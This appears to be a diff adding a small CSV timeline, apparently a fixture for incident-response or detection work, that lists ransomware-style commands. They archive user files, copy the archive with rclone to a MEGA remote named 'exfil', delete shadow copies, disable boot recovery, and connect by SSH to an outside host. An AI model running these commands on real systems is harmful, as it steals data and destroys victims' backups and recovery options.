@@ -1,0 +1,6 @@
+time,event
+2025-10-14T00:59:00Z,7z a archive.7z C:\Users\Public\*
+2025-10-14T01:02:00Z,rclone copy C:\Users\Public\archive.7z mega:exfil/
+2025-10-14T01:10:00Z,vssadmin delete shadows /all /quiet
+2025-10-14T01:11:00Z,bcdedit /set {default} recoveryenabled No
+2025-10-14T01:40:00Z,ssh -i key.ppk user@exfil-top.xyz
